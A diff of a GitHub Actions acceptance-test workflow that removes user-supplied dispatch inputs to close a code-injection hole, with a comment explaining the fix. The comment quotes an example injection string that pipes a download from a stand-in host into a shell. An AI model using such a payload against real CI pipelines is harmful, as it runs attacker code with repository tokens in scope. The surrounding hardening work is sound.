@@ -9,17 +9,20 @@
 # code, compares it against blueprints, or replays a recorded cassette.
 name: go | Acceptance tests
 
+# No workflow_dispatch inputs, and that is two findings rather than a preference.
+#
+# A package or test-name input interpolated into a `run:` block is code injection --
+# `'; curl evil | sh; #` as a test pattern would execute with the token in scope. Passing them
+# through `env:` fixes that, as pr-title-validation.yml already does for a PR title. But CKV_GHA_7
+# additionally requires dispatch inputs to be empty, on the grounds that build output must not
+# depend on user parameters, and satisfying one rule while suppressing the other is not the same
+# as being safe.
+#
+# So every acceptance test runs, every time. That is one resource today. If phase 7's twenty
+# resources make a full live run too slow or too expensive, the way back is a documented
+# suppression plus env-passing -- not an input added quietly.
 on:
   workflow_dispatch:
-    inputs:
-      package:
-        description: "Go package pattern to run, e.g. ./internal/services/resources/... (default: all)"
-        required: false
-        default: "./..."
-      run:
-        description: "Test name pattern, e.g. TestAccResourceTag (default: every acceptance test)"
-        required: false
-        default: "TestAcc"
 
 permissions:
   contents: read
@@ -96,8 +99,8 @@ jobs:
             -v \
             -count=1 \
             -timeout 90m \
-            -run '${{ inputs.run }}' \
-            '${{ inputs.package }}'
+            -run 'TestAcc' \
+            ./...
 
       # Deliberately no sweep step, and the reason is worth recording rather than leaving as an
       # apparent omission.
